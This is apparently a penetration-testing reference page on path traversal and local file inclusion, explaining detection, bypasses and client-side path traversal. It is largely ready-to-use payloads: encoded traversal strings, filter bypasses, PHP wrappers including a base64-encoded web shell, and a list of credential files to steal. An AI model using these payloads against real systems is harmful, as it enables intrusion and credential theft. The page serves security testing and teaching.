---
tags:
  - Web
---

# :material-folder-key: LFI / Path Traversal

<span class="pill pill-medium">file read</span> <span class="pill pill-info">web</span>

**Path traversal** (a.k.a. directory traversal) abuses a filename/path parameter to escape the intended directory and read arbitrary files. When the app then *includes/executes* the file, it becomes **Local File Inclusion (LFI)** — often a stepping stone to RCE.

!!! abstract "TL;DR"
    Find a parameter that names a file (`?file=`, `?page=`, `?template=`, download endpoints). Feed it `../../../../etc/passwd` and its encoded variants until the file content comes back.

## :material-magnify: Detection

```text
../../../../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
/etc/passwd
C:\windows\win.ini
```

!!! tip "The browser normalizes — the encoding doesn't"
    Typing `target.com/../../../../etc/passwd` in the address bar just makes the **browser** collapse the `../` and request `target.com/etc/passwd` — you never test the server. **URL-encode the slashes** so the browser leaves them alone and the *server* does the decoding:

    ```text
    target.com/..%2F..%2F..%2F..%2Fetc%2Fpasswd
    ```

    Now there's no client-side redirect and the traversal reaches the app. Use Burp Repeater to remove the browser from the loop entirely.

## :material-format-list-bulleted: Bypasses

```text
# Double URL-encoding (server decodes twice)
..%252f..%252f..%252fetc%252fpasswd

# Non-recursive filter stripping "../" once
....//....//....//etc/passwd
..././..././etc/passwd

# Absolute path when the app just prepends a dir
/etc/passwd

# Null byte (legacy PHP < 5.3.4) to cut a forced extension
../../../etc/passwd%00.png

# Force a required prefix directory
../../../../var/www/images/../../../../etc/passwd

# UTF-8 / overlong & backslash on Windows
..%c0%af..%c0%af..%c0%afetc/passwd
..\..\..\windows\win.ini
```

## :material-fire: LFI → more

- **PHP wrappers** to read source or execute:
  ```text
  php://filter/convert.base64-encode/resource=index.php
  php://filter/read=string.rot13/resource=config.php
  data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
  expect://id
  ```
- **Log poisoning** — inject PHP into a log (`User-Agent`, SSH auth log) then include `/var/log/apache2/access.log`.
- **`/proc/self/environ`** and session files (`/var/lib/php/sessions/sess_<id>`) as writable include targets.

!!! loot "High-value files to grab"
    ```text
    /etc/passwd  /etc/shadow  /etc/hosts
    /root/.ssh/id_rsa   ~/.bash_history   ~/.aws/credentials
    /var/www/html/config.php   .env   web.config
    /proc/self/cmdline   /proc/self/environ
    C:\Windows\System32\drivers\etc\hosts
    C:\inetpub\wwwroot\web.config
    ```

## :material-monitor-arrow-down: Client-side path traversal (CSPT) { #cspt }

*From "How One Path Traversal in Grafana Unleashed XSS, Open Redirect and SSRF (CVE-2025-4123)" by coffinxp (InfoSec Write-ups).*

Everything above is **server-side**: the traversal reaches a filesystem API and you
get file content back. **CSPT is the other half** — the traversal happens in the
*frontend*, inside a single-page app that builds URLs for routing, resource loading
or API calls without normalising them. Nothing leaves the intended origin's code
path; the escape simply changes which URL the browser is told to fetch or navigate to.

The payloads look familiar (`../`, backslashes, single and double percent-encoding),
but the target is a router or a `fetch()` template, not a `fopen()`. Because a
frontend decides *what to load* and *where to go*, one bad path normalisation forks
into three separate bugs:

- **XSS** — the app loads a script/module by path; escape it and it loads yours, executing on the victim's origin (session, tokens, API access).
- **Open redirect** — the app navigates by path; escape it and the trusted origin bounces the user to your domain.
- **Client-side SSRF** — the app fetches a resource by path; escape it to `127.0.0.1` or a metadata IP and the *browser* becomes your request proxy into the internal network.

Hunt it where a URL fragment or path segment is reflected into a client-side route
or a resource URL: plugin/module loaders, `?next=`/`?redirect=` handled in JS,
dynamic `import()`, and API base paths assembled from `location`. Try double
encoding (`%252f`), a backslash (`%5C`) after the traversal, and a trailing `%23` to
keep the SPA fragment intact.

CVE-2025-4123 in Grafana is the worked example of all three at once →
[Grafana](../webtech/grafana.md).

## :material-link-variant: Related

- Turns into RCE alongside [File Upload](file-upload.md) and [Command Injection](command-injection.md).
- Server-side fetch variant → [SSRF](ssrf.md); credential files → [Information Leakage](info-leakage.md).
- Reference: [PortSwigger Path Traversal](https://portswigger.net/web-security/file-path-traversal).
